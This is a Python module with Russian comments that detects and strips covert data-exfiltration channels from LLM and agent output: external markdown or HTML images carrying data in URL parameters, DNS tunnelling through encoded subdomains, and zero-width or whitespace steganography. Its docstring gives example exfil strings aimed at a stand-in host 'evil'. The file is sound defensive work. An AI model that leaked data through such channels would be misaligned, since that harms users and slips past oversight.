# -*- coding: utf-8 -*-
"""Детектор скрытых каналов эксфильтрации (Markdown Image Exfil, DNS-туннели, Stego-пробелы).

Закрывает главные обходные каналы слива данных из ответа LLM и вызовов агента:
1. Markdown-картинки и ссылки на внешние хосты с передачей данных в URL (`![x](https://evil/p.gif?d=...)`).
2. DNS-туннелирование через высокоэнтропийные hex/base32/base64 поддомены (`48656c6c6f...evil.com`).
3. Стеганография невидимыми символами / хвостовыми пробелами и табами (ZWSP/ZWNJ битовые последовательности).
"""
from __future__ import annotations

from collections import Counter
import math
import re
import urllib.parse
from typing import Any

_MD_IMAGE_RE = re.compile(r"!\[([^\]]*)\]\((https?://[^\s)]+)\)", re.IGNORECASE)
_HTML_IMG_RE = re.compile(r"<img\b[^>]*\bsrc\s*=\s*([\"'])(https?://[^\"']+)\1[^>]*>", re.IGNORECASE)
_HOST_CAND_RE = re.compile(r"\b([a-zA-Z0-9_-]{18,63}(?:\.[a-zA-Z0-9_-]{2,63})*\.[a-zA-Z]{2,12})\b")
_STEGO_ZW_RE = re.compile(r"[\u200B\u200C\u200D\u2060\uFEFF]{4,}")
_TRAILING_WS_STEGO_RE = re.compile(r"(?:[ \t]{6,}\r?\n){3,}")


def _entropy(s: str) -> float:
    if not s:
        return 0.0
    cnt = Counter(s)
    n = float(len(s))
    return -sum((c / n) * math.log2(c / n) for c in cnt.values())


def _host_allowed(host: str, allowed_domains: set[str]) -> bool:
    h = host.lower().split(":")[0]
    return any(h == d or h.endswith("." + d) for d in allowed_domains)


def inspect_exfil_channels(
    text: str,
    *,
    allowed_domains: set[str] | None = None,
) -> dict[str, Any]:
    """Ищет и обезвреживает скрытые каналы эксфильтрации в тексте/ответе модели."""
    raw = str(text or "")
    sanitized = raw
    allowed = {d.lower() for d in (allowed_domains or set())}
    findings: list[dict[str, str]] = []

    # 1. Markdown-картинки ![alt](https://...) и HTML <img src="https://...">
    def _check_img_url(url: str, kind: str) -> bool:
        parts = urllib.parse.urlsplit(url)
        host = parts.netloc.lower().split(":")[0]
        if host and _host_allowed(host, allowed):
            return False
        q_and_p = f"{parts.path}?{parts.query}" if parts.query else parts.path
        suspicious_query = len(parts.query) >= 12 or bool(re.search(r"(?:data|leak|key|tok|secret|q|d|b64)=", parts.query, re.I))
        high_ent = len(q_and_p) >= 24 and _entropy(q_and_p) >= 3.8
        # Любая внешняя авто-загружаемая картинка в ответе агента вне белого списка при наличии параметров или длинного пути — угроза эксфильтрации
        if suspicious_query or high_ent or (host and not allowed):
            findings.append({
                "code": f"{kind}_exfiltration_blocked",
                "severity": "critical" if (suspicious_query or high_ent) else "high",
                "detail": f"Перехвачена скрытая эксфильтрация через внешнее изображение ({host}): {url[:100]}",
            })
            return True
        return False

    for m in list(_MD_IMAGE_RE.finditer(sanitized)):
        if _check_img_url(m.group(2), "markdown_image"):
            sanitized = sanitized.replace(m.group(0), "[BLOCKED_EXTERNAL_IMAGE_EXFIL]")

    for m in list(_HTML_IMG_RE.finditer(sanitized)):
        if _check_img_url(m.group(2), "html_img"):
            sanitized = sanitized.replace(m.group(0), "[BLOCKED_EXTERNAL_IMG_EXFIL]")

    # 2. DNS-туннелирование (поддомены >= 20 символов с hex/base32/высокой энтропией)
    for m in _HOST_CAND_RE.finditer(raw):
        full_host = m.group(1).lower()
        labels = full_host.split(".")
        if len(labels) < 3:
            continue
        root_dom = ".".join(labels[-2:])
        if _host_allowed(root_dom, allowed):
            continue
        sub_labels = labels[:-2]
        longest = max(sub_labels, key=len)
        is_hex = bool(re.fullmatch(r"[0-9a-f]{20,}", longest))
        is_b32 = bool(re.fullmatch(r"[a-z2-7]{22,}", longest))
        ent = _entropy(longest)
        if is_hex or (is_b32 and ent >= 3.4) or (len(longest) >= 24 and ent >= 3.8) or len(sub_labels) >= 4:
            findings.append({
                "code": "dns_tunnel_exfiltration_detected",
                "severity": "critical",
                "detail": f"Обнаружено DNS-туннелирование в поддомене `{full_host[:90]}` (len={len(longest)}, H={ent:.2f}).",
            })
            sanitized = sanitized.replace(m.group(1), "[BLOCKED_DNS_TUNNEL]")
            break

    # 3. Стеганография невидимыми символами и хвостовыми пробелами/табами
    if _STEGO_ZW_RE.search(raw):
        findings.append({
            "code": "zero_width_stego_exfil",
            "severity": "high",
            "detail": "Обнаружена цепочка невидимых символов (ZWSP/ZWNJ стеганография) в тексте.",
        })
        sanitized = _STEGO_ZW_RE.sub("", sanitized)

    if _TRAILING_WS_STEGO_RE.search(raw):
        findings.append({
            "code": "whitespace_stego_exfil",
            "severity": "medium",
            "detail": "Обнаружена подозрительная стеганография хвостовыми пробелами/табами в нескольких строках.",
        })
        sanitized = re.sub(r"[ \t]+(\r?\n)", r"\1", sanitized)

    has_critical = any(f["severity"] == "critical" for f in findings)
    return {
        "ok": True,
        "blocked": has_critical,
        "has_findings": bool(findings),
        "findings": findings,
        "sanitized_text": sanitized,
    }
